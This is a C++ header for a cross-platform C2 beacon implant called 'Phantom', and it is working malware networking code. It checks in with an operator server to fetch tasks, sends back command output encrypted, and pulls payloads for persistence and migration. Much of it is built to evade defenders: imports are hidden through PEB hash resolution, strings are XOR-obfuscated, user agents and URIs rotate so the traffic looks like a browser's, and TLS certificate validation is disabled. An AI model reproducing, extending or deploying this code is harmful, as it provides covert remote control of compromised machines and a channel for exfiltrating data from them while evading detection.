#pragma once
// ============================================================================
//  network.h — Phantom Beacon Network Layer
//  ──────────────────────────────────────────
//  HTTPS communication with the C2 server using WinHTTP.
//  Traffic appears as standard HTTPS — indistinguishable from browser traffic
//  to network inspection tools.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winhttp.h>
    #include <wincrypt.h>
    // NOTE: winhttp.lib NOT linked — all WinHTTP functions resolved
    // dynamically via PEB hash lookup in winhttp_dynamic.h (no IAT)
#elif defined(__APPLE__)
    #include <curl/curl.h>
    #include <string.h>
    #include <algorithm>
#else
    // Linux + Android: raw sockets + OpenSSL (no libcurl dependency)
    #include <string.h>
    #include <algorithm>
    #include <sys/socket.h>
    #include <sys/select.h>
    #include <sys/time.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <openssl/pem.h>
    #include <openssl/x509.h>
#endif
#include <string>
#include <cstdlib>
#include <ctime>
#include <cstdint>
#include <array>
#include <algorithm>

#include "crypto.h"
#include "evasion.h"
#include "malleable.h"
#ifdef _WIN32
#include "winhttp_dynamic.h"
#endif

namespace net {

struct C2Config;

#ifdef _WIN32
// ── WinHTTP Connection State ──────────────────────────────────────────────
// Encapsulated handles: no static globals, single inline instance.
struct WinHttpContext {
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;

    bool ensure(const C2Config& cfg);
    void cleanup();
};

inline WinHttpContext g_ctx;
#endif

// ── Configuration ──────────────────────────────────────────────────────────
#ifdef C2_USE_HTTPS
static constexpr bool kUseHttps = C2_USE_HTTPS != 0;
#else
static constexpr bool kUseHttps = true;
#endif

struct C2Config {
#ifdef _WIN32
    std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
#else
    std::string  host      = XOR_DEC(XOR_STR("127.0.0.1")).c_str();
#endif
    int          port      = 8443;
    bool         use_https = kUseHttps;
    int          sleep_ms  = 5000;   // live cadence (may be raised by outage backoff)
    int          base_sleep_ms = 5000; // operator-configured base, restored after outages
    int          jitter    = 30;
    std::string  beacon_id;
#if BEACON_AUTH_ENABLED
    mutable uint64_t request_counter = 0;
    std::array<BYTE, crypto::AUTH_SECRET_LEN> auth_secret = [] {
        std::array<BYTE, crypto::AUTH_SECRET_LEN> value{};
        std::copy(BEACON_AUTH_SECRET, BEACON_AUTH_SECRET + crypto::AUTH_SECRET_LEN,
                  value.begin());
        return value;
    }();
#endif

    int get_sleep_ms() const {
        if (jitter <= 0) return sleep_ms;
        int variation = (sleep_ms * jitter) / 100;
        int offset = (rand() % (2 * variation + 1)) - variation;
        return std::max(1000, sleep_ms + offset);
    }
};

#if BEACON_AUTH_ENABLED
struct RequestAuth {
    std::string timestamp;
    std::string counter;
    std::string nonce;
    std::string signature;
};

inline RequestAuth make_request_auth(const C2Config& cfg,
                                     const std::string& method,
                                     const std::string& path,
                                     const std::string& body) {
    RequestAuth auth;
    auth.timestamp = std::to_string(static_cast<long long>(time(nullptr)));
    auth.counter = std::to_string(++cfg.request_counter);
    auth.nonce = crypto::random_hex(16);
    std::string canonical = method + "\n" + path + "\n" + auth.timestamp +
                            "\n" + auth.counter + "\n" + auth.nonce +
                            "\n" + body;
    auth.signature = crypto::hmac_sha256_hex(
        canonical, cfg.auth_secret.data(), cfg.auth_secret.size());
    return auth;
}
#endif

#ifdef _WIN32
inline std::wstring get_random_ua();

inline bool WinHttpContext::ensure(const C2Config& cfg) {
    if (hSession && hConnect) return true;
    
    if (hConnect) { winhttp_dyn::WinHttpCloseHandleDynamic(hConnect); hConnect = nullptr; }
    if (hSession) { winhttp_dyn::WinHttpCloseHandleDynamic(hSession); hSession = nullptr; }
    
    std::wstring ua = get_random_ua();
    hSession = winhttp_dyn::WinHttpOpenDynamic(
        ua.c_str(),
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = winhttp_dyn::WinHttpConnectDynamic(
            hSession,
            cfg.host.c_str(),
            static_cast<INTERNET_PORT>(cfg.port), 0);
        if (!hConnect) {
            winhttp_dyn::WinHttpCloseHandleDynamic(hSession);
            hSession = nullptr;
            return false;
        }
    }
    return hSession && hConnect;
}

// ── User-Agent Rotation (malleable-profile driven) ────────────────────────
// The user-agent pool now comes from the malleable C2 profile so a defender
// cannot fingerprint Phantom by a fixed UA set.

inline std::wstring get_random_ua() {
    const std::string& ua = malleable::next_user_agent();
    return std::wstring(ua.begin(), ua.end());
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    if (!g_ctx.ensure(cfg)) return "";

    DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;

    // Opens a fresh request handle with timeouts and (for HTTPS) the
    // self-signed-CA-bypass security flags. Every send attempt uses its own
    // pristine handle so a failed attempt can be retried cleanly.
    auto open_new_request = [&]() -> HINTERNET {
        HINTERNET h = winhttp_dyn::WinHttpOpenRequestDynamic(
            g_ctx.hConnect,
            method.c_str(),
            path.c_str(),
            nullptr,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags);
        if (!h) return nullptr;
        winhttp_dyn::WinHttpSetTimeoutsDynamic(h, 15000, 15000, 30000, 30000);
        if (cfg.use_https) {
            DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            winhttp_dyn::WinHttpSetOptionDynamic(h, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
        }
        return h;
    };

    HINTERNET hRequest = open_new_request();
    if (!hRequest) {
        g_ctx.cleanup();
        return "";
    }
#if BEACON_MTLS_ENABLED
    // Client certificate is BEST-EFFORT: the strong per-beacon auth is the
    // HMAC-SHA256 request signature (with timestamp/counter/nonce anti-replay).
    // WinHTTP's PFXImportCertStore + CLIENT_CERT_CONTEXT binding is brittle
    // across Windows builds (private-key association fails → GLE 12044 at
    // SendRequest, killing the whole request); a transport bug must never
    // silence the beacon when its identity is already cryptographically
    // verified per-request. On failure we simply proceed without the cert —
    // the server-side middleware decides whether that is acceptable.
    HCERTSTORE client_store = nullptr;
    PCCERT_CONTEXT client_cert = nullptr;
    CRYPT_DATA_BLOB pfx_blob{};
    pfx_blob.pbData = const_cast<BYTE*>(BEACON_CLIENT_PFX);
    pfx_blob.cbData = BEACON_CLIENT_PFX_LEN;
#ifndef PKCS12_NO_PERSIST_KEY
#define PKCS12_NO_PERSIST_KEY 0x00008000
#endif
    client_store = PFXImportCertStore(&pfx_blob, nullptr, PKCS12_NO_PERSIST_KEY);
    if (!client_store) {
        // NO_PERSIST unsupported on this build: retry with persistence
        client_store = PFXImportCertStore(&pfx_blob, nullptr, 0);
    }
    if (client_store) {
        client_cert = CertEnumCertificatesInStore(client_store, nullptr);
    }
#endif
// Obfuscate the Content-Type header using compile‑time XOR
auto enc_ct = XOR_STR("Content-Type: text/plain\r\n");
std::string s_ct = XOR_DEC(enc_ct).c_str();
std::wstring headers(s_ct.begin(), s_ct.end());

// ALWAYS add X-Beacon-Id
auto enc_xb = XOR_STR("X-Beacon-Id: ");
std::string s_xb = XOR_DEC(enc_xb).c_str();
std::wstring wprefix(s_xb.begin(), s_xb.end());

auto enc_rn = XOR_STR("\r\n");
std::string s_rn = XOR_DEC(enc_rn).c_str();
std::wstring wrn(s_rn.begin(), s_rn.end());

std::wstring wid(beacon_id.begin(), beacon_id.end());
headers += wprefix + wid + wrn;
// Payload-download token: sent ONLY on payload-fetch routes (persistence
// self-install, migrate PIC pull), never on routine check-ins — the payload
// secret must not recur in every beacon request.
auto wants_payload_token = [](const std::wstring& p) {
    if (p.find(L"/api/v1/payload") != std::wstring::npos) return true;
    return p == L"/x" || p.rfind(L"/x?", 0) == 0 || p.rfind(L"/x/", 0) == 0;
};
if (wants_payload_token(path)) {
    std::string at = std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + C2_PAYLOAD_TOKEN;
    std::wstring wat(at.begin(), at.end());
    headers += wat + wrn;
}
#if BEACON_AUTH_ENABLED
std::string method_narrow(method.begin(), method.end());
std::string path_narrow(path.begin(), path.end());
auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
headers += std::wstring(L"X-Beacon-Timestamp: ") + std::wstring(auth.timestamp.begin(), auth.timestamp.end()) + L"\r\n";
headers += std::wstring(L"X-Beacon-Counter: ") + std::wstring(auth.counter.begin(), auth.counter.end()) + L"\r\n";
headers += std::wstring(L"X-Beacon-Nonce: ") + std::wstring(auth.nonce.begin(), auth.nonce.end()) + L"\r\n";
headers += std::wstring(L"X-Beacon-Auth: ") + std::wstring(auth.signature.begin(), auth.signature.end()) + L"\r\n";
#endif

BOOL bResult = FALSE;
#if BEACON_MTLS_ENABLED
if (client_cert) {
    // Attempt 0: present the embedded client certificate.
    winhttp_dyn::WinHttpSetOptionDynamic(hRequest,
        WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
        (LPVOID)client_cert, sizeof(*client_cert));
    bResult = winhttp_dyn::WinHttpSendRequestDynamic(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        WINHTTP_NO_REQUEST_DATA,
        0,
        static_cast<DWORD>(body.size()),
        0);
    if (!bResult) {
        // The PFX private-key association is brittle across Windows builds
        // (TPM/MDM machines return ERROR_WINHTTP_CLIENT_CERT_NO_ACCESS
        // _PRIVATE_KEY). Retry once WITHOUT the cert on a pristine handle:
        // the HMAC signature already authenticates this beacon on every
        // request, so dropping the cert costs nothing — staying silent
        // would cost the whole session.
        winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
        hRequest = open_new_request();
    }
}
if (!bResult && hRequest) {
    // Explicitly present NO client certificate. A NULL CERT_CONTEXT is the
    // documented "send no cert" semantic and — critically — suppresses
    // schannel's auto-selection of a machine-store certificate whose
    // private key may be unreachable (that silent pick fails EVERY request
    // on such hosts with GLE 12044, even ones wanting no cert at all).
    winhttp_dyn::WinHttpSetOptionDynamic(hRequest,
        WINHTTP_OPTION_CLIENT_CERT_CONTEXT, nullptr, 0);
    bResult = winhttp_dyn::WinHttpSendRequestDynamic(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        WINHTTP_NO_REQUEST_DATA,
        0,
        static_cast<DWORD>(body.size()),
        0);
}
#else
bResult = winhttp_dyn::WinHttpSendRequestDynamic(
    hRequest,
    headers.c_str(),
    static_cast<DWORD>(headers.length()),
    WINHTTP_NO_REQUEST_DATA,
    0,
    static_cast<DWORD>(body.size()),
    0);
#endif
if (!bResult || !hRequest) {
#if BEACON_MTLS_ENABLED
    if (client_cert) CertFreeCertificateContext(client_cert);
    if (client_store) CertCloseStore(client_store, 0);
#endif
    g_ctx.cleanup();
    winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
    return "";
}

// Send body in chunks if present
if (!body.empty()) {
    DWORD totalSent = 0;
    while (totalSent < static_cast<DWORD>(body.size())) {
        DWORD chunkSize = static_cast<DWORD>(body.size()) - totalSent;
        if (chunkSize > 65536) chunkSize = 65536;
        if (!winhttp_dyn::WinHttpWriteDataDynamic(hRequest,
                body.c_str() + totalSent,
                chunkSize,
                &chunkSize)) {
#if BEACON_MTLS_ENABLED
            if (client_cert) CertFreeCertificateContext(client_cert);
            if (client_store) CertCloseStore(client_store, 0);
#endif
            g_ctx.cleanup();
            winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
            return "";
        }
        totalSent += chunkSize;
    }
}

bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
    if (!bResult) {
#if BEACON_MTLS_ENABLED
        if (client_cert) CertFreeCertificateContext(client_cert);
        if (client_store) CertCloseStore(client_store, 0);
#endif
        g_ctx.cleanup();
        winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
        return "";
    }
#if BEACON_MTLS_ENABLED
    PCCERT_CONTEXT peer_cert = nullptr;
    DWORD peer_size = sizeof(peer_cert);
    bool pin_ok = winhttp_dyn::WinHttpQueryOptionDynamic(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                                     &peer_cert, &peer_size) == TRUE;
    BYTE peer_hash[32] = {0};
    DWORD peer_hash_len = sizeof(peer_hash);
    if (pin_ok) {
        pin_ok = CryptHashCertificate(0, CALG_SHA_256, 0,
                                      peer_cert->pbCertEncoded,
                                      peer_cert->cbCertEncoded,
                                      peer_hash, &peer_hash_len) == TRUE;
        pin_ok = pin_ok && crypto::hex_encode(peer_hash, peer_hash_len) == BEACON_SERVER_FINGERPRINT;
    }
    if (peer_cert) CertFreeCertificateContext(peer_cert);
    if (!pin_ok) {
        if (client_cert) CertFreeCertificateContext(client_cert);
        if (client_store) CertCloseStore(client_store, 0);
        g_ctx.cleanup();
        winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
        return "";
    }
#endif

    {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!winhttp_dyn::WinHttpQueryDataAvailableDynamic(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            if (winhttp_dyn::WinHttpReadDataDynamic(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
                response_body.append(buffer.data(), dwDownloaded);
            }
        } while (dwSize > 0);
    }

#if BEACON_MTLS_ENABLED
    if (client_cert) CertFreeCertificateContext(client_cert);
    if (client_store) CertCloseStore(client_store, 0);
#endif
    winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
    return response_body;
}
#elif defined(__APPLE__)
// ── macOS (libcurl) —────────────────────────────────────────────────────────
inline std::string get_random_ua() {
    int r = rand() % 3;
    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
}

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    CURL *curl = curl_easy_init();
    if (!curl) return "";

#if BEACON_MTLS_ENABLED
    struct curl_blob ca_blob{const_cast<char*>(BEACON_CLIENT_CA_PEM),
                             strlen(BEACON_CLIENT_CA_PEM), CURL_BLOB_COPY};
    struct curl_blob cert_blob{const_cast<char*>(BEACON_CLIENT_CERT_PEM),
                               strlen(BEACON_CLIENT_CERT_PEM), CURL_BLOB_COPY};
    struct curl_blob key_blob{const_cast<char*>(BEACON_CLIENT_KEY_PEM),
                              strlen(BEACON_CLIENT_KEY_PEM), CURL_BLOB_COPY};
    curl_easy_setopt(curl, CURLOPT_CAINFO_BLOB, &ca_blob);
    curl_easy_setopt(curl, CURLOPT_SSLCERT_BLOB, &cert_blob);
    curl_easy_setopt(curl, CURLOPT_SSLKEY_BLOB, &key_blob);
#endif

    std::string proto = cfg.use_https ? XOR_DEC(XOR_STR("https://")).c_str() : XOR_DEC(XOR_STR("http://")).c_str();
    std::string host_narrow(cfg.host.begin(), cfg.host.end());
    std::string path_narrow(path.begin(), path.end());
    std::string url = proto + host_narrow + XOR_DEC(XOR_STR(":")).c_str() + std::to_string(cfg.port) + path_narrow;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua().c_str());
    
    std::string method_narrow(method.begin(), method.end());
    if (method_narrow == XOR_DEC(XOR_STR("POST")).c_str()) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (!body.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
        }
    } else {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
    }

    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    struct curl_slist *headers = NULL;
#if BEACON_AUTH_ENABLED
    auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
#endif
    auto enc_ct = XOR_STR("Content-Type: text/plain");
    headers = curl_slist_append(headers, XOR_DEC(enc_ct).c_str());
    if (!beacon_id.empty()) {
        auto enc_xb = XOR_STR("X-Beacon-Id: ");
        std::string h = std::string(XOR_DEC(enc_xb).c_str()) + beacon_id;
        headers = curl_slist_append(headers, h.c_str());
    }
    auto wants_tok = [](const std::string& u) {
        if (u.find("/api/v1/payload") != std::string::npos) return true;
        return u.rfind("/x", 0) == 0 && (u.size() == 2 || u[2] == '?' || u[2] == '/');
    };
    if (wants_tok(url))
        headers = curl_slist_append(headers, (std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + C2_PAYLOAD_TOKEN).c_str());
#if BEACON_AUTH_ENABLED
    headers = curl_slist_append(headers, ("X-Beacon-Timestamp: " + auth.timestamp).c_str());
    headers = curl_slist_append(headers, ("X-Beacon-Counter: " + auth.counter).c_str());
    headers = curl_slist_append(headers, ("X-Beacon-Nonce: " + auth.nonce).c_str());
    headers = curl_slist_append(headers, ("X-Beacon-Auth: " + auth.signature).c_str());
#endif
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

    if (cfg.use_https) {
#if BEACON_MTLS_ENABLED
        // mTLS: verify the chain against the private CA (client cert already
        // proves identity); hostname check is skipped because the operator
        // connects via IP while the cert SAN may only carry localhost.
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#else
        // Self-signed C2 certificate: mirror the Windows/Linux behaviour
        // (the payload is additionally AES-GCM encrypted end-to-end).
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif
    }

    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return response_body;
}
#else
// ── Linux + Android (raw sockets + OpenSSL) ────────────────────────────────
inline std::string get_random_ua() {
    int r = rand() % 3;
    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
}

inline bool connect_with_timeout(int sock, const sockaddr* address,
                                 socklen_t address_len, int timeout_seconds) {
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0 || fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) return false;
    int rc = connect(sock, address, address_len);
    if (rc < 0 && errno != EINPROGRESS) {
        fcntl(sock, F_SETFL, flags);
        return false;
    }
    if (rc < 0) {
        fd_set write_set;
        FD_ZERO(&write_set);
        FD_SET(sock, &write_set);
        timeval timeout{timeout_seconds, 0};
        rc = select(sock + 1, nullptr, &write_set, nullptr, &timeout);
        if (rc <= 0) {
            fcntl(sock, F_SETFL, flags);
            return false;
        }
        int socket_error = 0;
        socklen_t error_len = sizeof(socket_error);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &socket_error, &error_len) < 0 || socket_error != 0) {
            fcntl(sock, F_SETFL, flags);
            return false;
        }
    }
    fcntl(sock, F_SETFL, flags);
    return true;
}

#if BEACON_MTLS_ENABLED
inline int verify_server_pin(int preverify_ok, X509_STORE_CTX* store_ctx) {
    if (!preverify_ok) return 0;
    if (X509_STORE_CTX_get_error_depth(store_ctx) != 0) return 1;
    X509* certificate = X509_STORE_CTX_get_current_cert(store_ctx);
    if (!certificate) return 0;
    unsigned char digest[EVP_MAX_MD_SIZE] = {0};
    unsigned int digest_len = 0;
    if (X509_digest(certificate, EVP_sha256(), digest, &digest_len) != 1) return 0;
    return crypto::hex_encode(digest, digest_len) == BEACON_SERVER_FINGERPRINT;
}

inline bool configure_mtls(SSL_CTX* ssl_ctx) {
    BIO* ca_bio = BIO_new_mem_buf(BEACON_CLIENT_CA_PEM, -1);
    X509* ca_cert = ca_bio ? PEM_read_bio_X509(ca_bio, nullptr, nullptr, nullptr) : nullptr;
    if (ca_bio) BIO_free(ca_bio);
    if (!ca_cert || X509_STORE_add_cert(SSL_CTX_get_cert_store(ssl_ctx), ca_cert) != 1) {
        if (ca_cert) X509_free(ca_cert);
        return false;
    }
    X509_free(ca_cert);
    BIO* cert_bio = BIO_new_mem_buf(BEACON_CLIENT_CERT_PEM, -1);
    X509* client_cert = cert_bio ? PEM_read_bio_X509(cert_bio, nullptr, nullptr, nullptr) : nullptr;
    if (cert_bio) BIO_free(cert_bio);
    BIO* key_bio = BIO_new_mem_buf(BEACON_CLIENT_KEY_PEM, -1);
    EVP_PKEY* client_key = key_bio ? PEM_read_bio_PrivateKey(key_bio, nullptr, nullptr, nullptr) : nullptr;
    if (key_bio) BIO_free(key_bio);
    if (!client_cert || !client_key || SSL_CTX_use_certificate(ssl_ctx, client_cert) != 1 ||
        SSL_CTX_use_PrivateKey(ssl_ctx, client_key) != 1 ||
        SSL_CTX_check_private_key(ssl_ctx) != 1) {
        if (client_cert) X509_free(client_cert);
        if (client_key) EVP_PKEY_free(client_key);
        return false;
    }
    X509_free(client_cert);
    EVP_PKEY_free(client_key);
    SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_PEER, verify_server_pin);
    return true;
}
#endif

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    std::string host_narrow(cfg.host.begin(), cfg.host.end());
    std::string path_narrow(path.begin(), path.end());
    std::string method_narrow(method.begin(), method.end());

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return "";
    timeval io_timeout{15, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &io_timeout, sizeof(io_timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &io_timeout, sizeof(io_timeout));

    struct hostent *server = gethostbyname(host_narrow.c_str());
    if (!server) { close(sock); return ""; }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
    addr.sin_port = htons(static_cast<uint16_t>(cfg.port));

    SSL_CTX *ssl_ctx = nullptr;
    SSL *ssl = nullptr;
    if (cfg.use_https) {
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
        ssl_ctx = SSL_CTX_new(TLS_client_method());
        if (ssl_ctx) {
#if BEACON_MTLS_ENABLED
            if (!configure_mtls(ssl_ctx)) {
                SSL_CTX_free(ssl_ctx);
                close(sock);
                return "";
            }
#endif
            ssl = SSL_new(ssl_ctx);
            if (!ssl) {
                SSL_CTX_free(ssl_ctx);
                close(sock);
                return "";
            }
            SSL_set_tlsext_host_name(ssl, host_narrow.c_str());
            SSL_set_fd(ssl, sock);
        }
    }

    if (!connect_with_timeout(sock, (struct sockaddr*)&addr, sizeof(addr), 15)) {
        if (ssl) SSL_free(ssl);
        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
        close(sock);
        return "";
    }

    if (ssl && SSL_connect(ssl) <= 0) {
        SSL_free(ssl); SSL_CTX_free(ssl_ctx); close(sock);
        return "";
    }

#if BEACON_AUTH_ENABLED
    auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
#endif
    std::string req = method_narrow + " " + path_narrow + " HTTP/1.1\r\n"
        + "Host: " + host_narrow + ":" + std::to_string(cfg.port) + "\r\n"
        + "User-Agent: " + get_random_ua() + "\r\n"
        + "Content-Type: text/plain\r\n";
    if (!beacon_id.empty())
        req += "X-Beacon-Id: " + beacon_id + "\r\n";
    bool tok = path_narrow.rfind("/x", 0) == 0 &&
               (path_narrow.size() == 2 || path_narrow[2] == '?' || path_narrow[2] == '/');
    if (path_narrow.find("/api/v1/payload") != std::string::npos || tok)
        req += "X-Auth-Token: " + std::string(C2_PAYLOAD_TOKEN) + "\r\n";
#if BEACON_AUTH_ENABLED
    req += "X-Beacon-Timestamp: " + auth.timestamp + "\r\n";
    req += "X-Beacon-Counter: " + auth.counter + "\r\n";
    req += "X-Beacon-Nonce: " + auth.nonce + "\r\n";
    req += "X-Beacon-Auth: " + auth.signature + "\r\n";
#endif
    if (!body.empty())
        req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    req += "Connection: close\r\n\r\n";
    if (!body.empty())
        req += body;

    // Partial writes are legal for both SSL_write and send(): loop until the
    // whole request (headers + body) has been handed to the kernel, otherwise
    // the body may be silently dropped while the server still counts the
    // request — breaking the HMAC (signed body vs received empty body).
    if (ssl) {
        size_t total_sent = 0;
        while (total_sent < req.size()) {
            int written = SSL_write(ssl, req.data() + total_sent,
                                    static_cast<int>(req.size() - total_sent));
            if (written <= 0) break;
            total_sent += static_cast<size_t>(written);
        }
    } else {
        size_t total_sent = 0;
        while (total_sent < req.size()) {
            int written = static_cast<int>(send(sock, req.data() + total_sent,
                                                req.size() - total_sent, 0));
            if (written <= 0) break;
            total_sent += static_cast<size_t>(written);
        }
    }

    char buf[4096];
    int n;
    while ((n = ssl ? SSL_read(ssl, buf, sizeof(buf)) : static_cast<int>(recv(sock, buf, sizeof(buf), 0))) > 0) {
        if (response_body.size() + static_cast<size_t>(n) > 10 * 1024 * 1024) {
            if (ssl) { SSL_free(ssl); SSL_CTX_free(ssl_ctx); }
            close(sock);
            return "";
        }
        response_body.append(buf, static_cast<size_t>(n));
    }

    size_t hdr_end = response_body.find("\r\n\r\n");
    if (hdr_end != std::string::npos)
        response_body = response_body.substr(hdr_end + 4);

    if (ssl) { SSL_free(ssl); SSL_CTX_free(ssl_ctx); }
    close(sock);
    return response_body;
}
#endif

// ── High-Level C2 Functions ────────────────────────────────────────────────

// ── Malleable URIs (profile-driven) ────────────────────────────────────────

inline std::wstring get_malleable_path(const std::wstring& /*original*/) {
    std::string path = malleable::next_get_path();
    return std::wstring(path.begin(), path.end());
}

inline std::wstring get_malleable_result_path() {
    std::string path = malleable::next_post_path();
    return std::wstring(path.begin(), path.end());
}

// ── Check-in & Result ──────────────────────────────────────────────────────

// Check in with the C2 server and retrieve pending tasks.
// Returns the decrypted JSON string with tasks, or "" on failure.
inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
    std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
    
    std::string body = payload.empty() ? "" : crypto::encrypt(payload);
    
    std::wstring path = get_malleable_path(XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str());
    
    std::string encrypted_response = http_request(
        cfg, method, path, body, cfg.beacon_id);

    if (encrypted_response.empty()) return "";
    return crypto::decrypt(encrypted_response);
}

// Send an encrypted result back to the C2 server.
inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
    // Escape the output for JSON
    std::string escaped_output;
    for (char c : output) {
        if (c == '"') escaped_output += "\\\"";
        else if (c == '\\') escaped_output += "\\\\";
        else if (c == '\n') escaped_output += "\\n";
        else if (c == '\r') escaped_output += "\\r";
        else if (c == '\t') escaped_output += "\\t";
        else escaped_output += c;
    }

    // Build JSON payload
    std::string json = std::string(XOR_DEC(XOR_STR("{\"task_id\":\"")).c_str()) + task_id + XOR_DEC(XOR_STR("\",\"output\":\"")).c_str() + escaped_output + XOR_DEC(XOR_STR("\"}")).c_str();

    std::string encrypted = crypto::encrypt(json);
    if (encrypted.empty()) return false;
    
    std::wstring path = get_malleable_result_path();
    std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), path, encrypted, cfg.beacon_id);
    return !resp.empty();
}

#ifdef _WIN32
inline void cleanup() {
    g_ctx.cleanup();
}

inline void WinHttpContext::cleanup() {
    if (hConnect) { winhttp_dyn::WinHttpCloseHandleDynamic(hConnect); hConnect = nullptr; }
    if (hSession) { winhttp_dyn::WinHttpCloseHandleDynamic(hSession); hSession = nullptr; }
}
#endif

}  // namespace net
